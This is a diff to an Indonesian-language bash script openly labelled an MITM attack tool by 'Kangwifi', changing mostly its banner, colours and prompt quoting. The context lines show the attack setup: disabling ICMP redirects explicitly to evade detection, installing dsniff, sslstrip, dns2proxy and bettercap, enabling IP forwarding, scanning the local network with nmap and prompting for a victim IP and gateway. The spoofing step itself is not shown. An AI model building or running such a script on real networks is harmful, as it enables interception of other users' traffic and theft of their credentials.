@@ -11,6 +11,7 @@ red="\033[1;31m"
 green="\033[1;32m"
 yellow="\033[1;33m"
 blue="\033[1;34m"
+cyan="\033[1;36m"
 transparent="\e[0m"
 
 # Variabel jaringan
@@ -19,7 +20,7 @@ gateway=$(ip route | grep default | awk '{print $3}')
 interface=$(ip route | grep default | awk '{print $5}')
 
 clear
-echo -e "$blue[>>>>>>>>>>>> MITM Attack Script By Kangwifi <<<<<<<<<<<<]"
+echo -e "$yellow[!] Masih menunggu instalasi...$transparent"
 
 # Blokir ICMP Redirect untuk menghindari deteksi MITM
 echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects
@@ -49,7 +50,7 @@ function install_pkg() {
 }
 
 # Daftar paket yang akan diinstal
-deps=(xterm dsniff sslstrip dns2proxy bettercap nmap net-tools)
+deps=(xterm dsniff sslstrip dns2proxy bettercap nmap net-tools figlet)
 
 # Install semua paket yang dibutuhkan
 for pkg in "${deps[@]}"; do
@@ -61,6 +62,13 @@ done
 echo "1" > /proc/sys/net/ipv4/ip_forward
 echo -e "$green[✔] IP Forwarding diaktifkan"
 
+clear
+
+# Banner MITM ATTACK SCRIPT setelah instalasi selesai
+echo -e "$cyan"
+figlet "MITM ATTACK SCRIPT"
+echo -e "$yellow By Kangwifi$transparent"
+
 # Scan perangkat dalam jaringan
 echo -e "$yellow[+] Memindai perangkat dalam jaringan...$transparent"
 nmap -sn $lanip/24 | grep -E "Nmap scan report|MAC Address" > devices.txt
@@ -68,9 +76,9 @@ echo -e "$green[✔] Perangkat yang terdeteksi:"
 cat devices.txt
 
 # Konfigurasi target
-echo -ne "$yellow[?] Masukkan IP target: "$transparent""
+echo -ne "$yellow[?] Masukkan IP target: $transparent"
 read ipt
-echo -ne "$yellow[?] Masukkan IP gateway: "$transparent""
+echo -ne "$yellow[?] Masukkan IP gateway: $transparent"
 read ipg
 
 echo -e "$yellow[+] Menjalankan serangan MITM...$transparent"
